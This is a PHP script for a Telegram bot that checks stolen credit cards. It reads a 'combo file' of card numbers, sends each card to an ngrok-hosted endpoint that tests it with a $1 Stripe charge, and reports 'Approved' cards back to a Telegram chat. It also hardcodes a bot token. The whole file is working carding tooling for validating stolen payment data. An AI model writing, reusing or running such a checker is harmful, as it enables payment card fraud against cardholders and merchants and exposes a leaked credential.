<?php
//new
$botToken = "7201459757:AAE7CCAlBLCQ1ouzRva6tNBf3w2WMxoLXT8";
$endpoint = "https://api.telegram.org/bot".$botToken;
$linkData = file_get_contents('link.json');

if ($linkData === false) {
    die("Error: Unable to read link.json file.");
}

$linkData = json_decode($linkData, TRUE);
$file = $linkData['filename'];
$chatId = $linkData['chat_id'];
$message_id = $linkData['message_id'];
$cardList = file_get_contents($file);

if ($cardList === false) {
    die("Error: Unable to read card list file.");
}

$lines = explode("\n", $cardList);
$total = count($lines);
sendMessage($chatId, "Combo file submitted. Checking will start in a few minutes", $message_id, $total, true);

$baseUrl = "https://in-ram-grown.ngrok-free.app/?cc=";
$good = 0;
$bad = 0;
$updateMessageId = $message_id + 1;

foreach ($lines as $line) {
    $url = $baseUrl . urlencode($line);
    $data = file_get_contents($url);

    if ($data === false) {
        continue; // Skip this iteration if there's an error
    }

    if (strpos($data, "Approved") === 0) {
        $good++;
        update($chatId, "Checking in process\nChecking - $line\nApproved - $good\nDecline - $bad\nTotal - $total", $updateMessageId, $total, $good, $bad, $line);
        sendMessage($chatId, "
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
𝗖𝗖 ⇾ $line
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1$
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Thanks for supporting us");
    } else {
        $bad++;
        update($chatId, "Checking in process\nChecking - $line\nApproved - $good\nDecline - $bad\nTotal - $total", $updateMessageId, $total, $good, $bad, $line);
    }
}

function update($chatId, $message, $updateMessageId)
{

    $url = $GLOBALS['endpoint'] . "/editMessageText?chat_id=" . $chatId . "&message_id=" . $updateMessageId . "&text=" . urlencode($message) . "&parse_mode=HTML";
    file_get_contents($url);
}

function sendMessage($chatId, $message, $message_id = null)
{
        $url = $GLOBALS['endpoint'] . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($message) . "&parse_mode=HTML&reply_to_message_id=" . $message_id;
    file_get_contents($url);
}
?>
